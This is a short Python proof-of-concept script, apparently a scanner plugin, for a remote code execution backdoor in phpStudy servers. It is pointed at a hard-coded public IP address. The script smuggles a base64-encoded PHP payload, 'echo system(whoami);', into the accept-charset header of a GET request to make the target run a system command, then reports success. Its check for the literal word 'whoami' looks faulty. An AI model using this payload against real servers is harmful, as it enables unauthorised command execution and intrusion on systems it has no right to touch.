# -*-coding:utf-8-*-

import requests

def verify(protocol, ip, port):
    url = protocol + '://' + ip + ':' + str(port)
    print('testing if PhptudyRceWebshell vul')
    header = {'accept-charset': 'ZWNobyBzeXN0ZW0od2hvYW1pKTsK',
              'Accept-Encoding':'gzip,deflate'};

    try:
        response = requests.get((url),headers=header, timeout=5)
        if 'whoami' in response.text:
            msg = 'Found PhptudyRceWebshell vul in url:' + url + ''
            print(msg)
            number = 'v'
            return True, url, number, msg
        else:
            msg = 'Cannot found PhptudyRceWebshell vul in url:' + url + ''
            number = 'v0'
            return False, url, number, msg
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False, url, number, msg


if __name__ == '__main__':
    ip = '150.109.102.111'
    port = 80
    protocol = 'http'
    result = verify(protocol, ip, port)
    print(result)